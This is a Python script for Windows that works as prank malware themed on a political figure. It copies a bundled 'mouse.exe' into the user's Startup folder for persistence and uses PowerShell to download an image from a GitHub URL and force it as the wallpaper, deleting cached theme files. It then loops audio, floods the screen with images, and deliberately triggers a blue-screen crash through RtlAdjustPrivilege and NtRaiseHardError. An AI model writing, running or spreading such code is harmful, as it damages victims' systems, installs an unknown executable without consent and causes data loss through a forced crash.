import os
import subprocess
import time
from pathlib import Path
from ctypes import windll, c_int, c_uint, c_ulong, byref, POINTER

def get_asset_path(relative_path):
    base_path = os.path.dirname(os.path.abspath(__file__))
    return Path(base_path) / relative_path

def play_audio(path):
    # Uses Windows Media Control Interface (no Pygame needed)
    windll.winmm.mciSendStringW(f'open "{path}" type mpegvideo alias bgm', None, 0, 0)
    windll.winmm.mciSendStringW('play bgm repeat', None, 0, 0)

def mouse_setup():
    # %USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup

    mouse_path = get_asset_path("assets/mouse.exe")
    startup_dir = os.path.join(os.environ['USERPROFILE'], "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup")

    # Use os.system to run the Windows 'copy' command
    # Note: Quotes are used to handle potential spaces in file paths
    os.system(f'copy "{mouse_path}" "{startup_dir}"')

def set_wallpaper():
    """Executes PowerShell commands to download and set the desktop wallpaper."""
    ps_script = """
    $url = "https://raw.githubusercontent.com/skykosiner/charlie-kirk/refs/heads/master/assets/spam/image-6.jpg"
    $tempImage = "$env:TEMP\\downloaded_wallpaper.jpg"
    Invoke-WebRequest -Uri $url -OutFile $tempImage
    $themesDir = "$env:APPDATA\\Microsoft\\Windows\\Themes"
    $transcoded = Join-Path $themesDir "TranscodedWallpaper"
    $cachedFiles = Join-Path $themesDir "CachedFiles"
    Remove-Item $transcoded -Force -ErrorAction SilentlyContinue
    Remove-Item "$cachedFiles\\*" -Force -Recurse -ErrorAction SilentlyContinue
    Copy-Item $tempImage $transcoded -Force
    $code = @"
    using System.Runtime.InteropServices;
    public class Wallpaper {
        [DllImport(\"user32.dll\", CharSet = CharSet.Auto)]
        public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
    }
"@
    Add-Type -TypeDefinition $code
    [Wallpaper]::SystemParametersInfo(20, 0, $transcoded, 3)
    """
    # Execute the script via subprocess
    subprocess.run(["powershell", "-Command", ps_script], capture_output=True)


def main():
    mouse_setup()
    set_wallpaper()

    song_path = get_asset_path("assets/we-are-charlie-kirk-song.mp3")
    spam_dir = get_asset_path("assets/spam")

    if song_path.exists():
        play_audio(str(song_path))

    extensions = {'.jpg', '.png', '.jpeg', '.webp'}
    image_files = [i for i in spam_dir.iterdir() if i.suffix.lower() in extensions]

    for _ in range(5):
        for path in image_files:
            os.startfile(str(path))
            time.sleep(0.5)

    nullptr = POINTER(c_int)()
    windll.ntdll.RtlAdjustPrivilege(c_uint(19), c_uint(1), c_uint(0), byref(c_int()))

    # BSOD Trigger
    windll.ntdll.NtRaiseHardError(
        c_ulong(0xc000007B),
        c_ulong(0),
        nullptr,
        nullptr,
        c_uint(6),
        byref(c_uint())
    )

    while True:
        time.sleep(1)

if __name__ == "__main__":
    main()
